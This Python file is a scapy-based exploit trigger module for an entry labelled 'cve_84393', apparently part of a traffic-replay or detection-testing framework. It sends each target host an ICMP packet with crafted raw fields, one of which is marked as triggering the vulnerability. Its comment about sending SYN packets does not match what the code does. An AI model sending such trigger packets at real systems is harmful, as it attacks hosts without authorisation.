
from __future__ import print_function
from traffic.TrafficAPI import TrafficAPI

from scapy.all import UDP, IP, DNS, ICMP, Raw


class cve_84393(TrafficAPI):

    CATEGORY = "Exploit"

    def __init__(self):
        TrafficAPI.__init__(self)

    def run(self, hosts):

        # Send SYN with random Src Port for each Dst port
        for host in hosts:
            magic = '\xd5\x20\x08\x80'
            dst_ip = 'AAAA'
            dst_port = 'BBBB'
            state = 'CCCC'  # <===== this trigger the vulnerability
            ack = '\x00\x00\xff\xff'
            data_len = '\x00\x00\x00\x00'
            seq_id = 'DDDD'
            pkt = IP(dst=host) / ICMP() / Raw(magic) / Raw(dst_ip) / Raw(dst_port) / Raw(state) / Raw(ack) / Raw(data_len) / Raw(seq_id)
            self.send_receive(pkt)